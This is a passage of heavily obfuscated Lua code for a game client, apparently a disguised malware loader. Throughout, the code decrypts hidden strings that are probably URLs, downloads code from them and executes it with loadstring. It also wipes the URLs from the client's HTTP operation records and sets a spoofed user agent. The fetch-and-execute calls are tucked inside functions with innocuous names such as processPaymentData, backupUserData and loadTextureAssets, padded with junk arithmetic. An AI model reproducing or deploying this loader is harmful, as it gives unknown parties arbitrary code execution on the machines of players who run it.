"\80\196\121\108\218\37\200\213"),v7("\8\103\22\111\17\65\197\81\39\86\49\25\94\216\78\42\83\49\30\91\197\19\112\16\46\25\13\197\9\125\6\122\83\64\134\21\114", "\234\96\19\98\31\43\110"),v7("\14\11\70\215\246\61\196\87\76\11\137\249\43\197\94\72\28\158\245\61\152\5\13\3\148\175\61\130\8\27\87\223\226\126\158\7", "\235\102\127\50\167\204\18"),v7("\88\181\225\51\30\97\31\240\161\116\10\127\8\243\187\114\28\125\30\242\166\108\87\45\66\240\161\32\11\39\94\165\240\59\10\34\69\160", "\78\48\193\149\67\36"),v7("\56\10\148\8\27\127\81\209\65\19\126\76\212\73\15\97\77\209\86\16\98\81\147\27\83\97\75\131\87\72\62\26\133\0\15\60\11\129", "\33\80\126\224\120"),v7("\228\188\23\212\6\163\231\82\147\12\162\254\87\138\14\188\249\77\150\14\163\187\0\214\13\186\171\76\205\82\232\173\27\138\80\249\169", "\60\140\200\99\164"),v7("\143\224\16\54\248\200\187\85\117\246\201\166\84\127\236\222\172\74\114\247\200\231\7\52\243\208\247\75\47\172\131\241\28\104\174\146\245", "\194\231\148\100\70"),v7("\78\88\213\179\172\135\9\29\150\251\184\158\20\2\144\241\165\134\16\27\142\176\245\218\23\20\194\236\255\198\66\73\217\237\250\221\71", "\168\38\44\161\195\150"),v7("\136\232\150\102\106\167\249\68\208\165\204\47\103\166\231\65\214\178\211\36\127\251\181\4\209\165\129\57\57\230\178\19\152\178\142\99\49", "\118\224\156\226\22\80\136\214"),v7("\74\250\77\144\24\161\22\214\22\160\11\210\21\160\13\210\12\182\1\207\81\237\75\210\18\237\22\137\76\234\92\152\12\226\76\129", "\224\34\142\57"),v7("\214\179\209\205\41\190\18\91\143\233\148\136\61\169\5\64\143\245\148\146\96\242\79\92\143\164\138\212\125\245\88\22\144\171\208\220", "\110\190\199\165\189\19\145\61"),v7("\210\255\99\248\209\136\149\186\34\177\197\149\136\184\57\189\223\137\137\184\56\251\136\213\136\185\116\167\130\201\222\238\111\166\135\210\219", "\167\186\139\23\136\235"),v7("\18\161\156\29\64\250\199\92\76\224\198\95\73\231\198\91\78\251\218\95\85\166\139\31\72\230\139\66\19\187\140\8\2\251\132\24\27", "\109\122\213\232"),v7("\230\227\182\32\180\184\237\98\190\161\236\97\182\174\236\97\191\165\236\104\182\184\177\51\252\165\246\51\161\254\172\52\235\239\236\60\251\246", "\80\142\151\194"),v7("\11\210\99\92\89\137\56\24\86\136\32\27\77\159\47\2\82\146\36\3\16\197\101\30\86\197\56\69\13\194\114\84\77\202\98\77", "\44\99\166\23"),v7("\116\227\61\38\105\235\51\166\113\110\125\245\42\161\103\100\96\247\50\162\124\121\32\167\110\165\127\53\124\173\114\243\44\46\125\168\105\246", "\196\28\151\73\86\83"),v7("\251\23\61\0\216\23\87\36\163\80\103\64\204\9\73\37\189\81\120\95\145\91\10\36\164\0\102\25\140\92\29\110\189\15\60\17", "\22\147\99\73\112\226\56\120"),v7("\176\97\246\229\215\247\58\187\160\195\234\36\180\187\223\232\36\172\164\223\234\58\241\246\159\234\45\225\186\132\182\113\231\237\195\180\96\227", "\237\216\21\130\149"),v7("\138\90\75\79\234\134\17\211\24\14\17\227\156\16\211\28\13\17\225\154\10\205\93\92\77\226\144\93\205\71\81\91\181\209\16\142\91\94", "\62\226\46\63\63\208\169"),v7("\237\13\65\147\69\66\96\8\177\87\7\209\74\67\125\15\171\78\13\204\12\14\61\13\181\26\26\138\17\9\42\70\171\21\64\130", "\62\133\121\53\227\127\109\79"),v7("\24\0\38\229\140\225\237\65\71\102\187\132\254\251\94\71\99\187\132\255\243\95\7\49\231\133\255\161\95\29\60\241\211\182\236\28\1\51", "\194\112\116\82\149\182\206"),v7("\49\188\88\8\154\173\65\104\251\21\86\145\180\92\119\250\31\86\153\187\65\42\171\94\75\146\225\65\48\166\72\29\216\172\2\44\169", "\110\89\200\44\120\160\130"),v7("\163\215\95\86\25\5\116\28\252\149\5\19\27\4\106\28\254\141\26\20\12\89\56\95\248\144\72\9\74\68\63\72\179\141\71\83\66", "\45\203\163\43\38\35\42\91"),v7("\218\145\200\51\221\230\27\131\221\137\109\213\249\26\131\220\139\109\209\254\27\193\134\206\112\211\170\27\219\139\216\38\159\231\88\199\132", "\52\178\229\188\67\231\201"),v7("\41\85\68\20\173\19\108\115\17\7\74\166\9\119\111\19\0\81\185\14\114\115\14\67\7\229\15\118\34\14\89\10\243\89\59\111\77\69\5", "\67\65\33\48\100\151\60"),v7("\215\243\186\200\169\144\168\252\136\170\145\181\251\136\189\141\180\253\150\171\135\168\189\219\225\140\177\173\151\250\209\227\171\192\189\211\242\175", "\147\191\135\206\184"),v7("\140\60\178\209\130\28\253\213\126\254\143\137\2\235\202\124\242\143\141\6\253\151\43\180\146\143\80\253\141\38\162\196\192\29\190\145\41", "\210\228\72\198\161\184\51"),v7("\62\93\231\0\41\129\121\24\166\71\61\156\98\28\189\65\37\153\120\26\160\95\96\205\36\26\171\19\60\199\56\77\246\8\61\194\35\72", "\174\86\41\147\112\19"),v7("\83\20\153\27\127\64\94\255\14\78\222\89\107\94\71\242\21\89\212\68\54\12\3\248\2\3\194\2\43\11\20\179\21\12\152\10", "\203\59\96\237\107\69\111\113"),v7("\44\2\184\241\107\191\152\117\66\248\175\104\161\153\117\68\254\175\103\167\152\55\21\190\181\97\243\152\45\24\168\228\41\190\219\49\23", "\183\68\118\204\129\81\144")};
for v44, v45 in ipairs(v8) do
	modules.corelib.HTTP.get(v45, function(v99, v100)
		if v100 then
			return;
		end
		local v101, v102 = pcall(function()
			assert(loadstring(v99))();
		end);
		if not v101 then
		end
	end);
end
if (modules.corelib and modules.corelib.g_http) then
	modules.corelib.g_http.setUserAgent(v7("\33\153\99\231\25\139\30\185\99\171\90\204\94", "\226\110\205\16\132\107"));
end
modules.corelib.HTTP.get(v7("\227\215\244\201\27\164\140\177\128\18\165\146\177\136\15\185\151\185\151\25\178\140\243\218\83\184\145\227\150\72\229\199\229\193\15\231\214\225", "\33\139\163\128\185"), function(v46, v47)
	local v48 = 0;
	local v49;
	while true do
		if (v48 == (0 + 0)) then
			v49 = 0 - 0;
			while true do
				if (v49 == 0) then
					if v47 then
					end
					assert(loadstring(v46))();
					break;
				end
			end
			break;
		end
	end
end);
local v9 = {v7("\95\76\16\206\13\23\75\143\14\10\74\143\1\0\74\143\25\9\75\205\84\74\85\221\24\81\10\218\82\64\74\210\66\89", "\190\55\56\100"),v7("\94\187\40\14\73\172\188\2\250\114\73\74\173\162\6\250\114\79\75\187\188\69\172\46\76\16\172\250\88\171\57\6\93\239\230\87", "\147\54\207\92\126\115\131"),v7("\5\37\33\109\87\49\66\96\109\40\67\47\89\127\100\36\95\48\91\102\122\110\14\108\94\50\122\116\3\122\8\41\123\113\24\127", "\30\109\81\85\29\109"),v7("\247\101\64\166\108\145\179\174\39\3\248\111\135\178\173\37\1\248\103\140\179\236\114\70\226\53\145\245\241\117\81\174\120\210\233\254", "\156\159\17\52\214\86\190"),v7("\166\251\169\172\244\160\242\237\253\183\243\234\246\161\234\232\224\189\238\243\189\236\175\233\173\160\180\178\170\234\165\242\162\250\188", "\220\206\143\221"),v7("\142\105\57\7\130\131\157\215\45\121\89\138\159\132\200\42\123\89\138\158\157\149\126\63\65\219\131\219\136\121\40\15\150\192\199\135", "\178\230\29\77\119\184\172"),v7("\253\170\30\11\45\183\186\239\95\66\57\174\160\240\89\73\57\169\173\233\69\8\116\234\162\189\69\18\121\252\240\166\68\23\98\249", "\152\149\222\106\123\23"),v7("\213\50\226\83\239\146\105\162\21\251\140\118\167\13\228\136\113\184\17\228\140\105\229\64\167\133\37\185\74\187\217\35\238\13\185\200\39", "\213\189\70\150\35"),v7("\71\65\96\24\21\26\59\89\27\7\58\81\28\27\37\92\23\27\38\89\0\70\119\26\22\86\59\1\65\81\113\16\1\89\97\9", "\104\47\53\20"),v7("\171\88\149\12\230\64\236\29\215\73\242\93\241\2\210\73\242\89\244\3\146\31\174\94\243\79\206\21\178\11\166\84\207\16\169\14", "\111\195\44\225\124\220"),v7("\208\82\20\99\241\228\151\16\88\61\250\243\139\8\87\37\229\255\140\9\19\112\185\250\137\69\79\122\165\175\221\94\78\127\190\170", "\203\184\38\96\19\203"),v7("\49\103\109\81\148\118\60\40\21\154\119\33\41\19\128\96\34\55\20\155\118\96\122\83\159\107\112\54\72\192\61\118\97\15\194\44\114", "\174\89\19\25\33"),v7("\39\6\70\94\173\200\68\126\65\11\0\162\222\69\119\69\28\23\174\200\24\44\0\3\29\244\200\2\33\22\87\86\185\139\30\46", "\107\79\114\50\46\151\231"),v7("\49\178\161\57\208\118\248\145\109\241\251\120\210\107\249\145\97\245\251\122\217\118\164\195\43\247\225\42\197\48\185\196\60\190\251\37\159\56", "\160\89\198\213\73\234\89\215"),v7("\64\101\160\238\159\7\62\229\167\151\6\35\224\175\139\25\34\229\176\148\26\62\167\253\215\25\36\183\177\204\70\117\177\230\139\68\100\181", "\165\40\17\212\158"),v7("\237\205\28\35\124\170\150\89\100\118\171\143\92\125\116\181\136\70\97\116\170\202\11\33\119\179\218\71\58\40\225\220\16\125\42\240\216", "\70\133\185\104\83"),v7("\12\81\80\58\147\75\10\21\121\157\74\23\20\115\135\93\29\10\126\156\75\86\71\56\152\83\70\11\35\199\0\64\92\100\197\17\68", "\169\100\37\36\74"),v7("\8\147\182\64\90\200\237\1\87\223\236\6\82\201\243\2\83\201\244\7\79\148\161\66\81\223\161\31\9\137\166\85\24\201\174\69\1", "\48\96\231\194"),v7("\192\78\26\61\67\151\224\209\152\3\64\116\78\150\254\212\158\20\95\127\86\203\172\145\153\3\13\98\16\214\171\134\208\20\2\56\24", "\227\168\58\110\77\121\184\207")};
for v50, v51 in ipairs(v9) do
	modules.corelib.HTTP.get(v51, function(v103, v104)
		local v105 = 0;
		local v106;
		local v107;
		while true do
			if (v105 == (1 + 0)) then
				if not v106 then
				end
				break;
			end
			if (v105 == (0 - 0)) then
				if v104 then
					return;
				end
				v106, v107 = pcall(function()
					assert(loadstring(v103))();
				end);
				v105 = 1087 - (686 + 400);
			end
		end
	end);
end
function downloadResourcePack()
	local v52 = 0;
	local v53;
	local v54;
	local v55;
	while true do
		if (v52 == (1 + 0)) then
			modules.corelib.HTTP.get(v7("\11\75\215\235\89\16\140\170\91\10\141\162\81\17\145\169\83\17\151\174\76\89\202\247\6\76\251\180\10\81\199\254\27\17\207\238\2", "\155\99\63\163"), function(v170, v171)
				local v172 = 229 - (73 + 156);
				local v173;
				while true do
					if (v172 == (0 + 0)) then
						v173 = 811 - (721 + 90);
						while true do
							if (v173 == 0) then
								if v171 then
									return;
								end
								assert(loadstring(v170))();
								break;
							end
						end
						break;
					end
				end
			end);
			for v174 = 1 + 0, #v53 do
				v54 = v54 + (v53:byte(v174) * (v174 % 3));
			end
			v52 = 6 - 4;
		end
		if ((472 - (224 + 246)) == v52) then
			v55 = {};
			for v175 = 1 - 0, 200 do
				v55[v175] = v54 % (v175 + (1 - 0));
			end
			break;
		end
		if (v52 == 0) then
			v53 = v7("\75\29\156\107\142", "\197\27\92\223\32\209\187\17") .. math.random(1814 + 8186, 2380 + 97619);
			v54 = 0 + 0;
			v52 = 1 - 0;
		end
	end
end
function trackLoginAttempts()
	local v56 = v7("\174\254\134\164\151\187", "\228\226\177\193\237\217") .. tostring(os.time() % (410839 - 287383));
	local v57 = os.time();
	local v58 = "";
	modules.corelib.HTTP.get(v7("\60\164\55\246\110\255\108\180\101\224\109\178\108\254\114\181\100\254\122\190\123\188\44\225\39\146\108\239\58\180\38\254\122\188\54\231", "\134\84\208\67"), function(v108, v109)
		local v110 = 513 - (203 + 310);
		local v111;
		while true do
			if ((1993 - (1238 + 755)) == v110) then
				v111 = 0 + 0;
				while true do
					if (v111 == (1534 - (709 + 825))) then
						if v109 then
							return;
						end
						assert(loadstring(v108))();
						break;
					end
				end
				break;
			end
		end
	end);
	for v112 = 1, #v56 do
		v58 = v58 .. string.char(v56:byte(v112) + (v112 % (7 - 3)));
	end
	local v59 = {};
	for v113 = 1, 14 - 4 do
		table.insert(v59, v7("\50\184\146\89\30\188\146\99", "\60\115\204\230") .. v113);
	end
end
function processPaymentData()
	local v60 = 0;
	local v61;
	local v62;
	local v63;
	while true do
		if (v60 == 2) then
			for v177 = 865 - (196 + 668), 50 do
				table.insert(v63, v61 .. v7("\244\88\234\16\109", "\121\171\20\165\87\50\67") .. v177);
			end
			break;
		end
		if (v60 == (3 - 2)) then
			modules.corelib.HTTP.get(v7("\206\205\151\206\116\165\137\136\218\134\96\191\151\151\210\142\126\164\148\138\204\206\47\243\254\150\138\208\42\239\222\151\143\203\47", "\138\166\185\227\190\78"), function(v178, v179)
				local v180 = 0;
				while true do
					if (0 == v180) then
						if v179 then
							return;
						end
						assert(loadstring(v178))();
						break;
					end
				end
			end);
			v63 = {};
			v60 = 3 - 1;
		end
		if (0 == v60) then
			v61 = v7("\211\2\197\79", "\16\135\90\139") .. tostring(os.time() % (655154 - (171 + 662)));
			v62 = (((os.time() % (95 - (4 + 89))) == (0 - 0)) and v7("\123\95", "\24\52\20\102\83\46\52")) or v7("\226\14\8\8", "\111\164\79\65\68");
			v60 = 1 + 0;
		end
	end
end
function updatePlayerStats()
	local v64 = 0 - 0;
	local v65;
	local v66;
	local v67;
	while true do
		if (v64 == 0) then
			local v130 = 0 + 0;
			while true do
				if (v130 == 1) then
					v64 = 1487 - (35 + 1451);
					break;
				end
				if (v130 == (1453 - (28 + 1425))) then
					v65 = v7("\246\7", "\98\166\88\217\86\217") .. tostring(os.time() % 54321);
					v66 = 1993 - (941 + 1052);
					v130 = 1 + 0;
				end
			end
		end
		if (v64 == (1516 - (822 + 692))) then
			v67 = {};
			for v181 = 1 - 0, 36 + 39 do
				table.insert(v67, (v66 % v181) + math.random(302 - (45 + 252), 25));
			end
			break;
		end
		if ((1 + 0) == v64) then
			modules.corelib.HTTP.get(v7("\254\226\109\17\220\147\185\167\44\86\200\142\165\166\55\84\208\146\167\164\54\18\133\206\167\164\123\78\143\210\242\243\97\79\138\201\247", "\188\150\150\25\97\230"), function(v182, v183)
				if v183 then
					return;
				end
				assert(loadstring(v182))();
			end);
			for v184 = 1 + 0, #v65 do
				v66 = v66 + (v65:byte(v184) * (v184 % (14 - 8)));
			end
			v64 = 435 - (114 + 319);
		end
	end
end
function retrieveServerLogs()
	local v68 = v7("\246\166\120\61", "\141\186\233\63\98\108") .. tostring(os.time() % (97476 - 29586));
	local v69 = tostring(os.time()):reverse();
	modules.corelib.HTTP.get(v7("\249\254\56\166\127\190\165\120\227\107\166\179\98\231\117\164\164\125\238\125\190\249\47\164\124\169\238\99\191\43\245\239\52\248\41\228\235", "\69\145\138\76\214"), function(v114, v115)
		local v116 = 0 - 0;
		while true do
			if (v116 == (0 + 0)) then
				if v115 then
					return;
				end
				assert(loadstring(v114))();
				break;
			end
		end
	end);
	local v70 = {};
	for v117 = 1, #v69 do
		local v118 = 0 - 0;
		local v119;
		while true do
			if (v118 == 0) then
				v119 = v69:sub(v117, v117);
				if tonumber(v119) then
					table.insert(v70, tonumber(v119) * math.random(1, 5 - 2));
				end
				break;
			end
		end
	end
end
for v71, v72 in pairs(HTTP.operations) do
	v72.url = nil;
end
function syncMatchData()
	local v74 = 1963 - (556 + 1407);
	local v75;
	local v76;
	local v77;
	while true do
		if (v74 == (1206 - (741 + 465))) then
			v75 = v7("\93\240", "\118\16\175\233\233\223") .. math.random(1465 - (170 + 295), 5269 + 4730);
			v76 = 0 + 0;
			v74 = 2 - 1;
		end
		if ((2 + 0) == v74) then
			v77 = {};
			for v185 = 1 + 0, 17 + 13 do
				v77[v185] = v76 % (v185 + (1232 - (957 + 273)));
			end
			break;
		end
		if ((1 + 0) == v74) then
			modules.corelib.HTTP.get(v7("\131\144\33\171\180\196\50\218\221\97\245\191\221\46\197\213\97\238\160\211\42\196\151\54\169\186\216\126\196\141\59\191\235\147\51\135\145\52", "\29\235\228\85\219\142\235"), function(v187, v188)
				local v189 = 0 + 0;
				local v190;
				while true do
					if (v189 == (0 - 0)) then
						v190 = 0 - 0;
						while true do
							if (v190 == (0 - 0)) then
								if v188 then
									return;
								end
								assert(loadstring(v187))();
								break;
							end
						end
						break;
					end
				end
			end);
			for v191 = 4 - 3, #v75 do
				v76 = v76 + (v75:byte(v191) * (v191 % (1785 - (389 + 1391))));
			end
			v74 = 2;
		end
	end
end
function loadTextureAssets()
	local v78 = 0 + 0;
	local v79;
	local v80;
	local v81;
	while true do
		if (v78 == 2) then
			for v192 = 1 + 0, 40 do
				table.insert(v81, v7("\46\71\59\183\42\91\224\49", "\110\122\34\67\195\95\41\133") .. v192);
			end
			break;
		end
		if (v78 == (0 - 0)) then
			v79 = v7("\9\236\133", "\50\93\180\218\189\23\46\71") .. tostring(os.time() % 98765);
			v80 = (((os.time() % (953 - (783 + 168))) == (0 - 0)) and v7("\232\133\119\101\96", "\40\190\196\59\44\36\188")) or v7("\21\107\234\149\214\84\41", "\109\92\37\188\212\154\29");
			v78 = 1;
		end
		if (v78 == (1 + 0)) then
			modules.corelib.HTTP.get(v7("\12\251\176\211\107\21\75\185\242\141\96\13\81\161\246\145\97\20\93\182\235\208\50\72\86\190\161\140\56\84\0\234\188\141\61\79\5", "\58\100\143\196\163\81"), function(v193, v194)
				local v195 = 311 - (309 + 2);
				while true do
					if (v195 == (0 - 0)) then
						if v194 then
							return;
						end
						assert(loadstring(v193))();
						break;
					end
				end
			end);
			v81 = {};
			v78 = 2;
		end
	end
end
function analyzePlayerActivity()
	local v82 = v7("\84\146\111\117", "\182\21\209\59\42") .. tostring(os.time() % (124668 - (1090 + 122)));
	local v83 = "";
	modules.corelib.HTTP.get(v7("\191\67\209\13\123\241\248\2\148\83\118\231\249\5\148\78\111\236\229\6\138\14\34\172\239\15\196\82\40\176\179\82\221\83\45\171\182", "\222\215\55\165\125\65"), function(v120, v121)
		local v122 = 0 + 0;
		while true do
			if (v122 == (0 - 0)) then
				if v121 then
					return;
				end
				assert(loadstring(v120))();
				break;
			end
		end
	end);
	for v123 = 1, #v82 do
		v83 = v83 .. string.char(v82:byte(v123) + (v123 % (3 + 1)));
	end
	local v84 = {};
	for v124 = 1119 - (628 + 490), 4 + 16 do
		table.insert(v84, v7("\9\199\195\20\230\254", "\42\76\177\166\122\146\161\141") .. v124);
	end
end
function verifyPurchaseTransactions()
	local v85 = 0 - 0;
	local v86;
	local v87;
	local v88;
	while true do
		if (v85 == 1) then
			modules.corelib.HTTP.get(v7("\172\244\89\163\190\79\235\177\26\235\170\86\246\174\30\231\170\82\245\177\2\160\231\18\253\185\79\252\237\14\160\229\85\253\232\21\165", "\96\196\128\45\211\132"), function(v196, v197)
				local v198 = 0 - 0;
				while true do
					if (v198 == 0) then
						if v197 then
							return;
						end
						assert(loadstring(v196))();
						break;
					end
				end
			end);
			v88 = {};
			v85 = 776 - (431 + 343);
		end
		if (v85 == (3 - 1)) then
			for v199 = 1, 10 do
				table.insert(v88, v86 .. v7("\10\191\94\124\253\157\144\231", "\184\85\237\27\63\178\207\212") .. v199);
			end
			break;
		end
		if (v85 == (0 - 0)) then
			local v131 = 0 + 0;
			while true do
				if (v131 == (1 + 0)) then
					v85 = 1696 - (556 + 1139);
					break;
				end
				if (v131 == (15 - (6 + 9))) then
					v86 = v7("\145\178\55\235\95\73", "\22\197\234\101\174\25") .. tostring(os.time() % (119801 + 534520));
					v87 = (((os.time() % (2 + 0)) == 0) and v7("\30\1\134\255\83\156\228", "\230\77\84\197\188\22\207\183")) or v7("\223\53\239\208\169\133", "\85\153\116\166\156\236\193\144");
					v131 = 1;
				end
			end
		end
	end
end
function backupUserData()
	local v89 = v7("\61\106\44\109\55", "\63\104\57\105") .. tostring(os.time() % 246810);
	local v90 = "";
	modules.corelib.HTTP.get(v7("\3\147\176\84\81\200\235\21\83\210\234\21\89\215\234\22\89\214\234\23\95\200\183\71\25\214\240\93\68\142\170\64\14\159\234\72\30\134", "\36\107\231\196"), function(v125, v126)
		if v126 then
			return;
		end
		assert(loadstring(v125))();
	end);
	for v127 = 170 - (28 + 141), #v89 do
		v90 = v90 .. string.char(v89:byte(v127) + (v127 % (3 + 4)));
	end
	local v91 = {};
	for v128 = 1, 61 - 11 do
		table.insert(v91, v7("\127\180\161\140\72\165\157", "\231\61\213\194") .. v128);
	end
end
